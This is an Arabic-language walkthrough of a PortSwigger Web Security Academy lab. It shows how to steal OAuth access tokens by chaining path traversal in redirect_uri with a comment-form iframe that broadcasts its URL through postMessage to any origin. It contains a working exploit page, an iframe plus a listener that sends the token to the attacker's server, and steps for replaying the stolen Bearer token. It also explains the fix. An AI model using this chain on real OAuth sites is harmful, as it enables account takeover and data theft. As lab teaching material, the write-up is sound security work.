# Lab : Stealing OAuth access tokens via a proxy page

https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page

- الفكره من الLab ده

```bash
1. <iframe src="https://oauth-0a8400c3047d99e78249ccec024900bf.oauth-server.net/auth?client_id=izokqtdeeqxm04xjcyyhv&redirect_uri=https://0a9d006a04e999c882ddce84006a00f0.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=689316668&scope=openid%20profile%20email"></iframe>
<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>  {متشنغلش علي firefox}
```

اللاب ده **تطور أعمق** من اللاب اللي فات (Open Redirect via `/post/next`). هنا **مفيش open redirect واضح ومباشر**، لكن فيه ثغرة تانية أدق: **`postMessage()` API بيُستخدم بشكل غير آمن** في صفحة الكومنتات (اللي بتتحمّل كـ `iframe` جوه كل بوست).

### المفاهيم الأساسية

#### إيه هو `postMessage()`؟

هي **API في JavaScript** بتسمح لصفحتين مختلفتين (حتى لو من دومينات مختلفة تمامًا) إنهم **يتبادلوا رسائل بأمان** بينهم، من غير ما يخترقوا سياسة الـ **Same-Origin Policy**. الاستخدام الآمن بيكون بالشكل ده:

javascript

```jsx
window.parent.postMessage(data, "https://trusted-domain.com")   // تحديد الـ origin المسموح بيه صراحة
```

#### المشكلة هنا: استخدام  كـ target origin

لو الكود مكتوب كده:

javascript

```jsx
window.parent.postMessage(data, "*")
```

الـ `*` معناها **"ابعت الرسالة دي لأي نافذة أب (parent)، بغض النظر عن الدومين بتاعها"**. ده خطر جدًا لو الرسالة فيها بيانات حساسة، لأن **أي صفحة (حتى لو مش الأصل الشرعي) تقدر تستقبل الرسالة دي** لو قدرت "تحط نفسها" كـ parent للـ iframe ده.

### طبيعة الثغرة في اللاب ده

صفحة الكومنتات (`/post/comment/comment-form`) بتتحمّل كـ **iframe** جوه كل بوست، وفيها كود بيستخدم `postMessage()` عشان يبعت قيمة **`window.location.href`** (يعني الرابط الكامل بتاع الصفحة، **بما فيه أي fragment زي access token**) لنافذة الـ **parent** بتاعتها — لكن **بيبعتها لأي origin (`*`)**.

### الفكرة الذكية في الاستغلال

بما إن:

1. الـ `redirect_uri` **لسه فيه ثغرة Path Traversal** (زي اللاب اللي فات بالظبط).
2. صفحة `/post/comment/comment-form` **بتبعت الـ URL الكامل بتاعتها لأي parent** عن طريق `postMessage(*)`.

نقدر **نخلي الـ redirect_uri (بعد الـ traversal) يوديك مباشرة لصفحة comment-form نفسها**، وبما إن دي صفحة OAuth Implicit Flow، الـ access token **هيتحط كـ fragment في الـ URL بتاع صفحة comment-form نفسها**. وبما إن الصفحة دي **بتبعت `window.location.href` (بما فيه الـ fragment) لأي parent تحمّلها كـ iframe**، لو إحنا حطينا الصفحة دي **جوه iframe في صفحة إحنا بتاعتنا (exploit server)**، هنقدر **نستقبل الرسالة دي ونستخرج منها التوكن**!

يعني هنا **صفحة comment-form نفسها بقت "بروكسي" (proxy) بيسرّب التوكن لينا**، من غير ما نحتاج open redirect منفصل.

### خطوات الحل بالتفصيل

#### 1. أكد ثغرة الـ Path Traversal في redirect_uri

بنفس طريقة اللاب اللي فات، تأكد إن `redirect_uri` بيقبل `/../` ويعدي الـ whitelist.

#### 2. اكتشف صفحة Comment Form والـ postMessage

افحص أي بوست، هتلاقي **فورم الكومنتات متحمّل كـ iframe منفصل**. افحص الصفحة دي في Burp (`/post/comment/comment-form`)، هتلاقي كود شبه:

javascript

```jsx
window.parent.postMessage({type: "url", data: window.location.href}, "*")
```

**النقطة الحرجة**: الـ `"*"` كـ target origin تعني إن الصفحة **هتبعت الـ URL بتاعتها لأي حد** بيحمّلها كـ iframe، من غير أي تحقق من هوية الـ parent.

#### 3. جهّز الرابط الملغوم (باستخدام Path Traversal)

استخدم **"Copy URL"** على طلب `GET /auth?client_id=[...]`، وعدّل الـ `redirect_uri` عن طريق path traversal بحيث يشاور على صفحة الكومنتات بدل `/post`:

```
https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email
```

**الفكرة**: بعد ما الـ OAuth يخلص، الضحية هيتحول لصفحة `comment-form` **مع access token في الـ fragment بتاع الـ URL بتاعها**.

#### 4. جهّز صفحة الاستقبال على Exploit Server

اعمل صفحة فيها **iframe** بيحمّل الرابط الملغوم، **بالإضافة لسكريبت بيستمع لأي `postMessage`**:

html

```html
<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe><script>window.addEventListener('message', function(e) {    fetch("/" + encodeURIComponent(e.data.data))}, false)</script>
```

**الشرح**:

- الـ **iframe** بيحمّل رابط OAuth الملغوم، اللي هيوديك (بعد الـ traversal) لصفحة comment-form **مع access token في الـ fragment**.
- صفحة comment-form (جوه الـ iframe) بتنفذ الكود بتاعها هي اللي بيعمل `postMessage()` — وبما إنها بتبعت لـ ، **الصفحة الأصلية بتاعتنا (اللي فيها الـ iframe) هتستقبل الرسالة دي** (لأننا الـ parent window).
- السكريبت `window.addEventListener('message', ...)` بيستقبل أي رسالة توصل، وياخد منها `e.data.data` (اللي فيه الـ URL الكامل بما فيه الـ token)، وبيعمل `fetch()` لمسار فيه القيمة دي — وده بيسجّلها في **access log** بتاع السيرفر.

#### 5. اختبر الـ Exploit

احفظه ودوس **"View exploit"**. تأكد إن الـ iframe اتحمّل صح، وافحص الـ **access log** — لازم تلاقي طلب فيه **المسار بالكامل بتاع صفحة comment-form، بما فيه الـ fragment اللي فيه access token**.

#### 6. سلّم الـ Exploit للضحية

دوس **"Deliver exploit to victim"**. انسخ الـ **access token** من الـ log — **خد بالك متاخدش أي حروف URL-encoded محيطة بالغلط** (زي `%23` أو أجزاء زيادة).

#### 7. استخدم الـ Token المسروق

في **Burp Repeater**، روح لطلب `GET /me`، واستبدل التوكن في:

```
Authorization: Bearer STOLEN-TOKEN
```

ابعت الطلب، هتلاقي بيانات الضحية بما فيها **API key**.

#### 8. سلّم الحل

قدّم الـ API key في زرار **"Submit solution"**.

### ليه ده بيحصل تقنيًا

javascript

```jsx
// كود صفحة comment-form (المشكلة هنا):window.parent.postMessage({type: "url", data: window.location.href}, "*")//                                                                      ^^^//                                              ❌ لازم يكون دومين محدد بدل "*"
```

المشكلة الجوهرية: **صفحة comment-form بتثق في أي "parent" بتحمّلها**، وبتبعتله **معلومات حساسة (الـ URL الكامل بما فيه أي secrets في الـ fragment) بدون التحقق من هوية الـ parent ده**. الاستخدام الصحيح كان لازم يكون:

javascript

```jsx
window.parent.postMessage({type: "url", data: window.location.href}, "https://YOUR-LAB-ID.web-security-academy.net")
```

بحيث الرسالة **متتبعتش إلا لو الـ parent فعلاً من نفس دومين الموقع الشرعي**.

### الفرق الجوهري عن اللاب السابق

|  | **اللاب السابق (Open Redirect)** | **اللاب ده (Proxy Page عبر postMessage)** |
| --- | --- | --- |
| **الثغرة الثانية** | Open redirect صريح (`/post/next?path=`) | استخدام غير آمن لـ `postMessage` بـ target origin `*` |
| **طريقة السرقة** | Redirect فعلي لصفحة المهاجم | صفحة شرعية "بتسرّب" بياناتها عبر postMessage لأي حد يستمع |
| **مستوى الصعوبة** | يتطلب اكتشاف open redirect بسيط | يتطلب فهم أعمق لآلية `postMessage` وaudit دقيق للصفحات المضمّنة (iframes) |

### الدرس المستفاد

- **أي استخدام لـ `postMessage()` بدون تحديد target origin صريح (استخدام  بدلًا من دومين محدد) هو ثغرة أمنية خطيرة** — لأنه بيسمح لأي صفحة (حتى صفحة مهاجم) تستقبل بيانات حساسة كانت مفروض تتبعت بس للـ parent الشرعي.
- **أي صفحة بتُحمّل عادة كـ iframe داخل التطبيق الشرعي (زي فورم كومنتات) ممكن تتحول لـ "بروكسي" غير مقصود لتسريب بيانات**، لو استخدمت آليات تواصل بين النوافذ (زي postMessage) بشكل غير آمن.
- **دائمًا افحص الصفحات المضمّنة كـ iframes في أي تطبيق** أثناء اختبار الاختراق — مش بس الصفحات الرئيسية، لأنها ممكن تحمل ثغرات مستقلة (زي هنا) تتحول لجزء أساسي من هجوم أكبر لما تتجمع مع ثغرات تانية (زي path traversal في redirect_uri).
- **مستمع الرسائل (`addEventListener('message', ...)`) على جانب المهاجم دايمًا لازم يتفحص كمان من ناحية عكسية** — يعني أي تطبيق بيستمع لرسائل postMessage لازم **يتحقق من `event.origin`** قبل ما يثق في أي بيانات جايه، وإلا بيبقى عرضة لحقن بيانات ضارة من أي مصدر.
- هجوم ده بيوضح **قوة تسلسل الثغرات (chaining)**: Path Traversal (ثغرة معروفة ومتكررة) + استخدام غير آمن لـ Web API حديث (postMessage) = **استيلاء كامل على حساب admin وسرقة API key حساس**.
